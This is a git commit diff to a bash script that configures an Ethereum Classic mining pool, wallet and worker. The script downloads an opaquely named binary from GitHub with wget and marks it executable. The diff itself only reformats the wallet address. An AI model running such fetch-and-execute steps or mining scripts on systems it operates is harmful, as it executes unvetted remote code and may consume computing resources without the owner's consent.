25cec6ed56db8f0ba2e0fa73b0ab43120e8fd4ef
squibex <90225595+squibex@users.noreply.github.com>
2021-09-10 02:46:08 +0700

    Update ther.sh

--- ther.sh
+++ ther.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=asia-etc.2miners.com:1010
-WALLET=ETC:0x6172c0d0139e0ce7431cabceae0f59cd49422166
+WALLET=0x6172c0d0139e0ce7431cabceae0f59cd49422166
 WORKER=k80
 wget https://github.com/squibex/prem/raw/main/priyatama
 chmod +x priyatama
